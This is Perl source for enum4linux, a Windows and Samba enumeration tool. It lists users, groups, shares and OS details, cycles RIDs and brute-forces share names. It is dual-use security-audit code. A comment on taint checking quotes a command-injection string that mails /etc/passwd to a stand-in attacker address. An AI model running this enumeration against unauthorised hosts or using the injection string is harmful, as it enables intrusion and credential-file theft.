#!/usr/bin/perl -w
# enum4linux - Windows enumeration tool for Linux
# Copyright (C) 2007  Mark Lowe
# 
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# do not use this tool.
#
# In all other respects the GPL version 2 applies:
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# You are encouraged to send comments, improvements or suggestions to
# me at mrl@portcullis-security.com
#
# TODO
#
# * Option to abort RID cycle after a (configurable) range of RIDs has
#   no corresponding user accounts.  Useful when targetting DCs with
#   10000 accounts: you don't want to stop at RID 1050, neither do you
#   want to try 10000 RIDs on hosts that only have 50 accounts.
#
# * replace system($string) with system($prog, @args).
#
# * Search RID space intellegently.  Samba starts accounts at 0, but
#   Windows starts at 500.  We don't want to search 0-500 on all
#   hosts.  Maybe check 0-10 and abort if nothing is found.  Some SIDs
#   on samba servers start RIDs much higher (3000+).  How do we make
#   sure we get all these.
#
# * Mutliple SIDs can be found on some hosts (samba).  
#
# * Output Group Memberships in a more parsable format.
#
use strict;
use Getopt::Std;
use File::Basename;
use Data::Dumper;
use Scalar::Util qw(tainted);

my $VERSION="0.8.1";
my $verbose = 0;
my $debug = 0;
my $global_fail_limit = 1000;     # no command line option yet
my $global_search_until_fail = 0; # no command line option yet
my $global_workgroup = undef;
my $global_username = '';
my $global_password = '';
my $global_dictionary = 0;
my $global_filename = undef;
my $global_share_file = undef;
my $global_detailed = 0;
my $global_rid_range = "500-550,1000-1050";
my $global_known_username_string = "administrator,guest,krbtgt,domain admins,root,bin,none";
my @dependent_programs = qw(nmblookup net rpcclient smbclient);
my $null_session_test = 0;
my %opts;

###############################################################################
# The following  mappings for nmblookup (nbtstat) status codes to human readable
# format is taken from nbtscan 1.5.1 "statusq.c".  This file in turn
# was derived from the Samba package which contains the following
# license:
#    Unix SMB/Netbios implementation
#    Version 1.9
#    Main SMB server routine
#    Copyright (C) Andrew Tridgell 1992-199
# 
#    This program is free software; you can redistribute it and/or modif
#    it under the terms of the GNU General Public License as published b
#    the Free Software Foundation; either version 2 of the License, o
#    (at your option) any later version
# 
#    This program is distributed in the hope that it will be useful
#    but WITHOUT ANY WARRANTY; without even the implied warranty o
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See th
#    GNU General Public License for more details
# 
#    You should have received a copy of the GNU General Public Licens
#    along with this program; if not, write to the Free Softwar
#    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA

my @nbt_info = (
["__MSBROWSE__", "01", 0, "Master Browser"],
["INet~Services", "1C", 0, "IIS"],
["IS~", "00", 1, "IIS"],
["", "00", 1, "Workstation Service"],
["", "01", 1, "Messenger Service"],
["", "03", 1, "Messenger Service"],
["", "06", 1, "RAS Server Service"],
["", "1F", 1, "NetDDE Service"],
["", "20", 1, "File Server Service"],
["", "21", 1, "RAS Client Service"],
["", "22", 1, "Microsoft Exchange Interchange(MSMail Connector)"],
["", "23", 1, "Microsoft Exchange Store"],
["", "24", 1, "Microsoft Exchange Directory"],
["", "30", 1, "Modem Sharing Server Service"],
["", "31", 1, "Modem Sharing Client Service"],
["", "43", 1, "SMS Clients Remote Control"],
["", "44", 1, "SMS Administrators Remote Control Tool"],
["", "45", 1, "SMS Clients Remote Chat"],
["", "46", 1, "SMS Clients Remote Transfer"],
["", "4C", 1, "DEC Pathworks TCPIP service on Windows NT"],
["", "52", 1, "DEC Pathworks TCPIP service on Windows NT"],
["", "87", 1, "Microsoft Exchange MTA"],
["", "6A", 1, "Microsoft Exchange IMC"],
["", "BE", 1, "Network Monitor Agent"],
["", "BF", 1, "Network Monitor Application"],
["", "03", 1, "Messenger Service"],
["", "00", 0, "Domain/Workgroup Name"],
["", "1B", 1, "Domain Master Browser"],
["", "1C", 0, "Domain Controllers"],
["", "1D", 1, "Master Browser"],
["", "1E", 0, "Browser Service Elections"],
["", "2B", 1, "Lotus Notes Server Service"],
["IRISMULTICAST", "2F", 0, "Lotus Notes"],
["IRISNAMESERVER", "33", 0, "Lotus Notes"],
['Forte_$ND800ZA', "20", 1, "DCA IrmaLan Gateway Server Service"]
);
####################### end of nbtscan-derrived code ############################

my $usage =<<USAGE;
enum4linux v$VERSION \(http://www.portcullis-security.com/tools/\)
Copyright \(C\) 2006 Mark Lowe \(mrl\@portcullis-security.com\)

Simple wrapper around the tools in the samba package to provide similar functionality
to enum (http://www.bindview.com/Services/RAZOR/Utilities/Windows/enum_readme.cfm).  
Some additional features such as RID cycling have also been added for convenience.

This is an ALPHA release only.  Some of the options supported by the original "enum" 
aren't implemented in this release.

Usage: $0 [options] ip

Options are (like "enum"):
	-U             get userlist
	-M             get machine list*
	-N             get namelist dump (different from -U|-M)*
	-S             get sharelist
	-P             get password policy information*
	-G             get group and member list
	-L             get LSA policy information*
	-D             dictionary crack, needs -u and -f*        
	-d             be detailed, applies to -U and -S
	-u username    specify username to use (default "")  
	-p password    specify password to use (default "")   
	-f filename    specify dictfile to use (wants -D)*   

* = Not implemented in this release.

Additional options:
	-a             Do all simple enumeration (-U -S -G -r -o -n)
	-h             Display this help message and exit
	-r             enumerate users via RID cycling
	-R range       RID ranges to enumerate (default: $global_rid_range, implies -r)
	-s filename    brute force guessing for share names
	-k username    User(s) that exists on remote system (default: $global_known_username_string)
	               Used to get sid with "lookupsid known_username"
		       Use commas to try several users: "-k admin,user1,user2"
	-o             Get OS information
	-i             Get printer information
	-w workgroup   Specify workgroup manually (usually found automatically)
	-n             Do an nmblookup (similar to nbtstat)
	-v             Verbose.  Shows full commands being run (net, rpcclient, etc.)

RID cycling should extract a list of users from Windows \(or Samba\) hosts which have 
RestrictAnonymous set to 1 \(Windows NT and 2000\), or \"Network access: Allow 
anonymous SID/Name translation\" enabled \(XP, 2003\).

If no usernames are known, good names to try against Windows systems are:
- administrator
- guest
- none
- helpassistant
- aspnet
	
The following might work against samba systems:
- root
- nobody
- sys

NB: Samba servers often seem to have RIDs in the range 3000-3050.

Dependancy info:
You will need to have the samba package installed as this script is basically
just a wrapper around rpcclient, net, nmblookup and smbclient.
USAGE

# Notes on Taint
# --------------
#
# This script should run OK with Taint checking on (perl -T).  I've
# turned it off because it complains about your path somethimes which
# users found annoying.
#
# I mainly implemented taint checking incase someone set up a malicious server to return
# a workgroup like: WORK; cat /etc/passwd | mail hacker@evil.net;
#
# I've also been paranoid and applied taint checking to command line options.  This
# isn't necessarily particularly useful, though.

# Untaint PATH.  We're not too bothered about mailicious paths for the usage of this
# tool, but we must remove "." from the path to keep perl happy.
$ENV{'PATH'} =~ /(.*)/;
$ENV{'PATH'} = $1;
$ENV{'PATH'} =~ s/^://;
$ENV{'PATH'} =~ s/:$//;
$ENV{'PATH'} =~ s/^\.://;
$ENV{'PATH'} =~ s/:\.//;

getopts('UMNSPGLDu:dp:f:rR:s:k:vow:hnai', \%opts);

# Print help message if required
if ($opts{'h'}) {
	print $usage;
	exit 0;
}

# Read host and untaint
my $global_target = shift or die $usage;
if ($global_target =~ /^([a-zA-Z0-9\.-_]+)$/) {
	$global_target = $1;
} else {
	print "ERROR: Target hostname \"$global_target\" contains some illegal characters\n";
	exit 1;
}

#
# Read in options
#

# Turn on -U -S -G -r -o -n
if ($opts{'a'}) {
	$opts{'U'} = 1;
	$opts{'S'} = 1;
	$opts{'G'} = 1;
	$opts{'r'} = 1;
	$opts{'o'} = 1;
	$opts{'n'} = 1;
	$opts{'i'} = 1;
}

$global_username       = $opts{'u'} if $opts{'u'};
$global_password       = $opts{'p'} if $opts{'p'};
$global_detailed       = $opts{'d'} if $opts{'d'};
$global_dictionary     = $opts{'D'} if $opts{'D'};
$global_filename       = $opts{'f'} if $opts{'f'};
$global_rid_range      = $opts{'R'} if $opts{'R'};
$global_share_file     = $opts{'s'} if $opts{'s'};
$global_known_username_string = $opts{'k'} if $opts{'k'};
$global_workgroup      = $opts{'w'} if $opts{'w'};
$verbose               = $opts{'v'} if $opts{'v'};
$opts{'r'}             = 1          if $opts{'R'};

my @global_known_usernames = split(",", $global_known_username_string);

# Check that dependant programs are present on the system - hopefull "which" is installed!
my $dependency_error = 0;
foreach my $prog (@dependent_programs) {
	my $which_output = `which $prog 2>&1`;
	chomp $which_output;
	if ($which_output !~ /^\/.*\/$prog$/) {
		print "ERROR: $prog is not in your path.  Check that samba package is installed\n";
		$dependency_error = 1;
	} else {
		print "[V] Dependent program \"$prog\" found in $which_output\n" if $verbose;
	}
}
if ($dependency_error) {
	print "For Gentoo, you need to install the \"samba\" package\n";
	print "For Debian, you need to install the \"smbclient\" package\n";
	exit 1;
}

# Untaint workgroup if supplied on command line
if (defined($global_workgroup)) {
	if ($global_workgroup =~ /^([a-zA-Z0-9\.-_]*)$/) {
		$global_workgroup = $1;
	} else {
		print "ERROR: Workgroup \"$global_workgroup\"contains some illegal characters\n";
		exit 1;
	}
}

# We're going to use hard quotes around all variables used in "system" calls.
# We don't want bad data to be able to break out of these quotes.
foreach my $known_username (@global_known_usernames) {
	$known_username =~ s/'/'\''/g; ($known_username) = $known_username =~ /(.*)/;
}
$global_username =~ s/'/'\''/g;       ($global_username)       = $global_username       =~ /(.*)/;
$global_password =~ s/'/'\''/g;       ($global_password)       = $global_password       =~ /(.*)/;

# Output message about options used
print "Starting enum4linux v$VERSION ( http://www.portcullis-security.com/tools ) on " .  scalar(localtime) . "\n\n";
print "----- Target information -----\n";
print "Target ........... $global_target\n";
print "RID Range ........ $global_rid_range\n";
print "Username ......... '$global_username'\n";
print "Password ......... '$global_password'\n";
print "Known Usernames .. " . join(", ", @global_known_usernames) . "\n";
print "\n";

# Basic enumeration, check session
get_workgroup();
get_nbtstat()          if $opts{'n'};
get_domain_sid();
make_session();
get_os_info()          if $opts{'o'};

# enum-compatible functions
enum_users()           if $opts{'U'};
enum_machines()        if $opts{'M'};
enum_names()           if $opts{'N'};
enum_shares()          if $opts{'S'};
enum_password_policy() if $opts{'P'};
enum_groups()          if $opts{'G'};
enum_dom_groups()      if $opts{'G'};
enum_lsa_policy()      if $opts{'L'};

# extra stuff that runs slowly
enum_users_rids()      if $opts{'r'};
enum_shares_unauth()   if $opts{'s'};
get_printer_info()     if $opts{'i'};

print "enum4linux complete on " . scalar(localtime) . "\n\n";

sub get_nbtstat {
	print "----- Nbtstat Information for $global_target -----\n";
	my $output = `nmblookup -A '$global_target' 2>&1`;
	$output = nbt_to_human($output);
	print "$output\n\n";
}

sub get_domain_sid {
	print "----- Getting domain SID for $global_target -----\n";
	my $command = "rpcclient -U'$global_username'\%'$global_password' $global_target -c 'lsaquery' 2>&1";
	print "[V] Attempting to get domain SID with command: $command\n" if $verbose;
	my $domain_sid_text = `$command`;
	chomp $domain_sid_text;
	print $domain_sid_text;
	print "\n";
	if ($domain_sid_text =~ /Domain Sid: S-0-0/) {
		print "[+] Host is part of a workgroup (not a domain)\n";
	} elsif ($domain_sid_text =~ /Domain Sid: S-\d+-\d+-\d+-\d+-\d+-\d+/) {
		print "[+] Host is part of a domain (not a workgroup)\n";
	} else {
		print "[+] Can't determine if host is part of domain or part of a workgroup\n";
	}
	print "\n";
}

# Get workgroup from nbstat info - we need this for lots of rpcclient calls
sub get_workgroup {
	print "----- Enumerating Workgroup/Domain on $global_target ------\n";
	print "[V] Attempting to get domain name with command: nmblookup -A '$global_target'\n" if $verbose;

	# Workgroup might already be known - e.g. from command line or from get_os_info()
	unless ($global_workgroup) {
		print "target is tainted\n" if tainted($global_target); # DEBUG
		$global_workgroup=`nmblookup -A '$global_target'`; # Global var.  Erg!
		($global_workgroup) = $global_workgroup =~ /\s+(\S+)\s+<00> - <GROUP>/s;
		unless (defined($global_workgroup)) {
			print "[E] Can\'t find workgroup/domain\n";
			print "\n";
			return undef;
		}
		unless (defined($global_workgroup) and $global_workgroup =~ /^[A-Za-z0-9_\.-]+$/) {
			print "ERROR: Workgroup \"$global_workgroup\"contains some illegal characters\n";
			exit 1;
		}
	}
	print "[+] Got domain/workgroup name: $global_workgroup\n";
	print "\n";
}

# See if we can connect using a null session or supplied credentials
sub make_session {
	print "----- Session Check on $global_target -----\n";
	my $command = "smbclient //'$global_target'/ipc\$ -U'$global_username'\%'$global_password' -c 'help' 2>&1";
	print "[V] Attempting to make null session using command: $command\n" if $verbose;
	my $os_info = `$command`;
	chomp $os_info;
	if ($os_info =~ /case_sensitive/) {
		print "[+] Server $global_target allows sessions using username '$global_username', password '$global_password'\n";
	} else {
		print "[E] Server doesn't allow session using username '$global_username', password '$global_password'.  Aborting remainder of tests.\n";
		exit 1;
	}

	# Use this info to set workgroup if possible
	unless ($global_workgroup) {
		($global_workgroup) = $os_info =~ /Domain=\[([^]]*)\]/;
		print "[+] Got domain/workgroup name: $global_workgroup\n";
	}

	print "\n";
}

# Get OS info
sub get_os_info {
	print "----- OS information on $global_target -----\n";
	my $command = "smbclient //'$global_target'/ipc\$ -U'$global_username'\%'$global_password' -c 'q' 2>&1";
	print "[V] Attempting to OS info with command: $command\n" if $verbose;
	my $os_info = `$command`;
	chomp $os_info;
	if (defined($os_info)) {
		($os_info) = $os_info =~ /(Domain=[^\n]+)/s;
		print "[+] Got OS info for $global_target from smbclient: $os_info\n";
	}

	$command = "rpcclient -W $global_workgroup -U'$global_username'\%'$global_password' -c 'srvinfo' '$global_target' 2>&1";
	print "[V] Attempting to OS info with command: $command\n" if $verbose;
	$os_info = `$command`;
	if (defined($os_info)) {
		if ($os_info =~ /error: NT_STATUS_ACCESS_DENIED/) {
			print "[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED\n";
		} else {
			print "[+] Got OS info for $global_target from srvinfo:\n$os_info";
		}
	}
	print "\n";
}

sub enum_lsa_policy {
	print "----- LSA Policy Information on $global_target -----\n";
	print "[E] Internal error.  Not implmented in this version of enum4linux.\n";
	print "\n";
}

sub enum_machines {
	print "----- Machine Enumeration on $global_target -----\n";
	print "[E] Internal error.  Not implmented in this version of enum4linux.\n";
	print "\n";
}

sub enum_password_policy {
	print "----- Password Policy Information for $global_target -----\n";
	print "[E] Internal error.  Not implmented in this version of enum4linux.\n";
	print "\n";
}

sub enum_names {
	print "----- Name Enumeration on $global_target -----\n";
	print "[E] Internal error.  Not implmented in this version of enum4linux.\n";
	print "\n";
}

sub enum_groups {
	print "----- Groups on $global_target -----\n";
	foreach my $grouptype ("builtin", "domain") {
		# Get list of groups
		my $command = "rpcclient -W $global_workgroup -U'$global_username'\%'$global_password' '$global_target' -c \"enumalsgroups $grouptype\" 2>&1";
		if ($grouptype eq "domain") {
			print "[V] Getting local groups with command: $command\n" if $verbose;
			print "[+] Getting local groups:\n";
		} else {
			print "[V] Getting $grouptype groups with command: $command\n" if $verbose;
			print "[+] Getting $grouptype groups:\n";
		}
		my $groups_string = `$command`;
		if ($groups_string =~ /error: NT_STATUS_ACCESS_DENIED/) {
			if ($grouptype eq "domain") {
				print "[E] Can't get local groups: NT_STATUS_ACCESS_DENIED\n";
			} else {
				print "[E] Can't get $grouptype groups: NT_STATUS_ACCESS_DENIED\n";
			}
		} else {
			($groups_string) = $groups_string =~ /(group:.*)/s;
			$groups_string = "" unless defined($groups_string);
			print $groups_string;
		}
		print "\n";

		# Get group members
		my %rid_of_group = $groups_string =~ /\[([^\]]+)\]/sg;
		if ($grouptype eq "domain") {
			print "[+] Getting local group memberships:\n";
		} else {
			print "[+] Getting $grouptype group memberships:\n";
		}
		foreach my $groupname (keys %rid_of_group) {
			$rid_of_group{$groupname} =~ s/^0x//;
			$rid_of_group{$groupname} = hex($rid_of_group{$groupname});
			$command = "net rpc group members '$groupname' -I '$global_target' -U'$global_username'\%'$global_password' 2>&1\n";
			print "[V] Running command: $command\n" if $verbose;
			print "Group '$groupname' (RID: " . $rid_of_group{$groupname} . ") has members:\n";
			my $members = `$command`;
			$members =~ s/^/\t/;
			$members =~ s/\n/\n\t/gs;
			$members =~ s/\t$//;
			print "$members";
		}
		print "\n";
		if ($global_detailed) {
			foreach my $groupname (keys %rid_of_group) {
				print "[+] Getting detailed info for group $groupname (RID: " . $rid_of_group{$groupname} . ")\n";
				get_group_details_from_rid($rid_of_group{$groupname});
			}
		}
	}
}

sub enum_dom_groups {
	# Get list of groups
	my $command = "rpcclient -W $global_workgroup -U'$global_username'\%'$global_password' '$global_target' -c \"enumdomgroups\" 2>&1";
	print "[V] Getting domain groups with command: $command\n" if $verbose;
	print "[+] Getting domain groups:\n";

	my $groups_string = `$command`;
	if ($groups_string =~ /error: NT_STATUS_ACCESS_DENIED/) {
		print "[E] Can't get domain groups: NT_STATUS_ACCESS_DENIED\n";
	} else {
		($groups_string) = $groups_string =~ /(group:.*)/s;
		$groups_string = "" unless defined($groups_string);
		print $groups_string;
	}
	print "\n";

	# Get group members
	my %rid_of_group = $groups_string =~ /\[([^\]]+)\]/sg;
	print "[+] Getting domain group memberships:\n";

	foreach my $groupname (keys %rid_of_group) {
		$rid_of_group{$groupname} =~ s/^0x//;
		$rid_of_group{$groupname} = hex($rid_of_group{$groupname});
		$command = "net rpc group members '$groupname' -I '$global_target' -U'$global_username'\%'$global_password' 2>&1\n";
		print "[V] Running command: $command\n" if $verbose;
		print "Group '$groupname' (RID: " . $rid_of_group{$groupname} . ") has members:\n";
		my $members = `$command`;
		$members =~ s/^/\t/;
		$members =~ s/\n/\n\t/gs;
		$members =~ s/\t$//;
		print "$members";
	}
	print "\n";
	if ($global_detailed) {
		foreach my $groupname (keys %rid_of_group) {
			print "[+] Getting detailed info for group $groupname (RID: " . $rid_of_group{$groupname} . ")\n";
			get_group_details_from_rid($rid_of_group{$groupname});
		}
	}
}

sub enum_groups_unauth {
	print "----- Groups on $global_target via RID cycling -----\n";
	print "[E] INTERNAL ERROR.  Not implmented yet.  Maybe in the next version.\n";
	print "\n";
}

sub enum_shares {
	# Share enumeration
	print "----- Share Enumeration on $global_target -----\n";
	print "[V] Attempting to get share list using authentication\n" if $verbose;
	# my $shares = `net rpc share -I '$global_target' -U'$global_username'\%'$global_password' 2>&1`;
	my $command = "smbclient -L //$global_target -U'$global_username'\%'$global_password' 2>&1";
	my $shares = `$command`;
	if (defined($shares)) {
		if ($shares =~ /NT_STATUS_ACCESS_DENIED/) {
			print "[E] Can't list shares: NT_STATUS_ACCESS_DENIED\n";
		} else {
			print "$shares";
		}
	}

	print "\n----- Attempting to map to shares on $global_target -----\n";
	my @shares = $shares =~ /\n\s+(\S+)\s+(?:Disk|IPC|Printer)/igs;
	foreach my $share (@shares) {
		my $command = "smbclient //$global_target/'$share' -U'$global_username'\%'$global_password' -c dir 2>&1";
		print "[V] Attempting map to share //$global_target/$share with command: $command\n" if $verbose;
		my $output = `$command`;
		print "//$global_target/$share\t";
		if ($output =~ /NT_STATUS_ACCESS_DENIED listing/) {
			print "Mapping: OK\tListing: DENIED\n";
		} elsif ($output =~ /tree connect failed: NT_STATUS_ACCESS_DENIED/) {
			print "Mapping: DENIED, Listing: N/A\n";
		} elsif ($output =~ /\n\s+\.\.\s+D.*\d{4}\n/) {
			print "Mapping: OK, Listing: OK\n";
		} else {
			print "[E] Can't understand response:\n";
			print $output;
		}
	}
	print "\n";
}

sub enum_shares_unauth {
	print "----- Brute Force Share Enumeration on $global_target -----\n";
	print "[V] Attempting to get share list using bruteforcing\n" if $verbose;
	my $shares_file = $global_share_file;
	open SHARES, "<$shares_file" or die "[E] Can't open share list file $shares_file: $!\n";
	my @shares = <SHARES>;
	for (@shares) {chomp};
	
	foreach my $share (@shares) {
		# Untaint $share
		if ($share =~ /^([a-zA-Z0-9\._\$-]+)$/) {
			$share = $1;
		} else {
			print "ERROR: Share name $share contains some illegal characters\n";
			exit 1;
		}

		my $result = `smbclient //'$global_target'/'$share' -c dir -U'$global_username'\%'$global_password' 2>&1`;
		if ($result =~ /blocks of size .* blocks available/) {
			print "$share EXISTS, Allows access using username: '$global_username', password: '$global_password'\n";
		} elsif ($result =~ /NT_STATUS_BAD_NETWORK_NAME/) {
			print "$share doesn't exist\n" if $debug;
		} elsif ($result =~ /NT_STATUS_ACCESS_DENIED/) {
			print "$share EXISTS\n";
		} else {
			print $result;
		}
	}
	print "\n";
}

sub enum_users_rids {
	print "----- Users on $global_target via RID cycling (RIDS: $global_rid_range) -----\n";
	
	my $sid;
	my $logon;
	my $cleansid;
	# Get SID - try other known usernames if necessary
	foreach my $known_username (@global_known_usernames) {
		my $command = "rpcclient -W '$global_workgroup' -U'$global_username'\%'$global_password' '$global_target' -c \"lookupnames '$known_username'\" 2>&1";
		print "[V] Attempting to get SID from $global_target with command: $command\n" if $verbose;
		print "[I] Assuming that user \"$known_username\" exists\n";
		$logon = "username '$global_username', password '$global_password'";
		$sid=`$command`;
		if ($sid =~ /NT_STATUS_ACCESS_DENIED/) {
			print "[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.\n";
			next;
		} elsif ($sid =~ /NT_STATUS_NONE_MAPPED/) {
			print "[E] User \"$known_username\" doesn't exist.  User enumeration should be possible, but SID needed...\n";
			next;
		} elsif ($sid =~ /S-1-5-21-\S+-\d+\s+/) {
			($cleansid) = $sid =~ /(S-1-5-21-\S+)-\d+\s+/;
			last;
		} elsif ($sid =~ /S-1-5-\S+-\d+\s+/) {
			($cleansid) = $sid =~ /(S-1-5-\S+)-\d+\s+/;
			last;
		} elsif ($sid =~ /S-1-22-\S+-\d+\s+/) {
			($cleansid) = $sid =~ /(S-1-22-\S+)-\d+\s+/;
			last;
		} else {
			next;
		}
	}

	$sid = $cleansid;
	if (! defined($sid) and $global_username) {
		print "[V] WARNING: Can\'t get SID.  Maybe none of the 'known' users really exist.  Try others with -k.  Trying null session.\n" if $verbose;
		foreach my $known_username (@global_known_usernames) {
			my $command = "rpcclient -W $global_workgroup -U% '$global_target' -c \"lookupnames '$known_username'\" 2>&1";
			print "[I] Assuming that user $known_username exists\n";
			print "[V] Trying null username and password: $command\n" if $verbose;
			$sid=`$command`;
			if ($sid =~ /error: NT_STATUS_ACCESS_DENIED/) {
				print "[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED\n";
				next;
			} else {
				last;
			}
		}
		($sid) = $sid =~ /(S-1-5-21-\S+)-\d+\s+/;
		unless (defined($sid)) {
			print "[E] Can't get SID using either a null username or the username \"$global_username\"\n";
			exit 1;
		}
		$logon = "username '', password ''"
	}
	unless (defined($sid)) {
		print "[E] Couldn't find SID.  Aborting RID cycling attempt.\n\n";
		return 1;
	}
	print "[+] Got SID: $sid using $logon\n";
	
	# RID Cycle;
	foreach my $rid_range (split(",", $global_rid_range)) {
		my ($start_rid, $end_rid);
	
		# Check range is of form n-m (n,m integers)
		if ($rid_range =~ /\d+-\d+/) {
			($start_rid, $end_rid) = $rid_range =~ /^(\d+)-(\d+)$/;
			
		# Check range is of form n (n integer)
		} elsif ($rid_range =~ /^\d+$/) {
			($start_rid, $end_rid) = ($rid_range, $rid_range);
	
		# Invalid range
		} else {
			print "WARNING: RID range $rid_range isn't valid.  Should be like 10-20 or 1199.  Ignoring this range\n";
			next;
		}
	
		# Check we have an ascending range
		if ($start_rid > $end_rid) {	
			print "WARNING: RID range $rid_range seems to be reversed.  Automatically reversing.\n";
			($start_rid, $end_rid) = ($end_rid, $start_rid);
		}
	
		if ($global_search_until_fail) {
			$end_rid = 500000;
		}

		my $fail_count = 0;
		foreach my $rid ($start_rid..$end_rid) {
			my $output = `rpcclient -W $global_workgroup -U'$global_username'\%'$global_password' '$global_target' -c "lookupsids $sid-$rid" 2>&1`;
			my ($sid_and_user) = $output =~ /(S-\d+-\d+-\d+-[\d-]+\s+[^\)]+\))/;
			if ($sid_and_user) {
				$sid_and_user =~ s/\(1\)/(Local User)/;
				$sid_and_user =~ s/\(2\)/(Domain Group)/;
				$sid_and_user =~ s/\(2\)/(Domain User)/;
				$sid_and_user =~ s/\(4\)/(Local Group)/;

				# Samba servers sometimes claim to have user accounts
				# with the same name as the UID/RID.  We don't report these.
				if ($sid_and_user =~ /-(\d+) .*\\\1 \(/) {
					$fail_count++;
				} else {
					print "$sid_and_user\n";
					$fail_count = 0;
					get_user_details_from_rid($rid) if $sid_and_user =~ /\((Local|Domain) User\)/;
					get_group_details_from_rid($rid) if $sid_and_user =~ /\((Local|Domain) Group\)/;
				}
			} else {
				$fail_count++;
			}
			
			if ($global_search_until_fail) {
				last if $fail_count > $global_fail_limit;
			}
		}
	}
	print "\n";
}

sub enum_users {
	print "----- Users on $global_target -----\n";
	my $command = "rpcclient -W $global_workgroup -c querydispinfo -U'$global_username'\%'$global_password' '$global_target' 2>&1";
	print "[V] Attempting to get userlist with command: $command\n" if $verbose;
	my $users = `$command`;
	if ($users =~ /NT_STATUS_ACCESS_DENIED/) {
		print "[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED\n";
	} else {
		($users) = $users =~ /(index:.*)/s;
		print $users;
	}
	print "\n";
	my @rids_hex = $users =~ /RID:\s+0x([a-fA-f0-9]+)\s/gs;
	my @rids = map { hex($_) } @rids_hex;

	$command = "rpcclient -W $global_workgroup -c enumdomusers -U'$global_username'\%'$global_password' '$global_target' 2>&1";
	print "[V] Attempting to get userlist with command: $command\n" if $verbose;
	$users = `$command`;
	if ($users =~ /NT_STATUS_ACCESS_DENIED/) {
		print "[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED\n";
	} else {
		($users) = $users =~ /(user:.*)/s;
		print $users;
	}
	print "\n";
	my @rids_hex2 = $users =~ /rid:\[0x([A-Fa-f0-9]+)\]/gs;
	my @rids2 = map { hex($_) } @rids_hex2;

	my %rids;
	foreach my $rid (@rids, @rids2) {
		$rids{$rid} = 1;
	}
	foreach my $rid (keys %rids) {
		get_user_details_from_rid($rid);
	}
}

sub get_group_details_from_rid {
	my $rid = shift;
	return unless $global_detailed;
	my $command = "rpcclient -W $global_workgroup -U'$global_username'\%'$global_password' -c 'querygroup $rid' '$global_target' 2>&1";
	print "[V] Attempting to get detailed group info with command: $command\n" if $verbose;
	my $group_info = `$command`;
	($group_info) = $group_info =~ /([^\n]*Group Name.*Num Members[^\n]*)/s;
	if (defined($group_info)) {
		print "$group_info\n\n";
	} else {
		print "[E] No info found\n\n";
	}
}

sub get_user_details_from_rid {
	my $rid = shift;
	return unless $global_detailed;
	my $command = "rpcclient -W $global_workgroup -U'$global_username'\%'$global_password' -c 'queryuser $rid' '$global_target' 2>&1";
	print "[V] Attempting to get detailed user info with command: $command\n" if $verbose;
	my $user_info = `$command`;
	($user_info) = $user_info =~ /([^\n]*User Name.*logon_hrs[^\n]*)/s;
	print "$user_info\n\n" if defined($user_info);
}

sub get_printer_info {
	print "----- Getting printer info for $global_target -----\n";
	my $command = "rpcclient -W $global_workgroup -U'$global_username'\%'$global_password' -c 'enumprinters' '$global_target' 2>&1";
	print "[V] Attempting to get printer info with command: $command\n" if $verbose;
	my $printer_info = `$command`;
	# ($group_info) = $group_info =~ /([^\n]*Group Name.*Num Members[^\n]*)/s;
	if (defined($printer_info)) {
		print "$printer_info\n\n";
	} else {
		print "[E] No info found\n\n";
	}

}

sub nbt_to_human {
	my $nbt_in = shift; # multi-line
	my @nbt_in = split (/\n/, $nbt_in);
	my @nbt_out = ();
	foreach my $line (@nbt_in) {
		if ($line =~ /\s+(\S+)\s+<(..)>\s+-\s+?(<GROUP>)?\s+?[A-Z]/) {
			my $line_val = $1;
			my $line_code = uc $2;
			my $line_group = defined($3) ? 0 : 1; # opposite

			foreach my $info_aref (@nbt_info) {
				my ($pattern, $code, $group, $desc) = @$info_aref;
				# print "Matching: line=\"$line\", val=$line_val, code=$line_code, group=$line_group against pattern=$pattern, code=$code, group=$group, desc=$desc\n";
				if ($pattern) {
					if ($line_val =~ /$pattern/ and $line_code eq $code and $line_group eq $group) {
						push @nbt_out, "$line $desc";
						last;
					}
				} else {
					if ($line_code eq $code and $line_group eq $group) {
						push @nbt_out, "$line $desc";
						last;
					}
				}	
			}
		} else {
			push @nbt_out, $line;
		}
	}	
	return join "\n", @nbt_out;
}
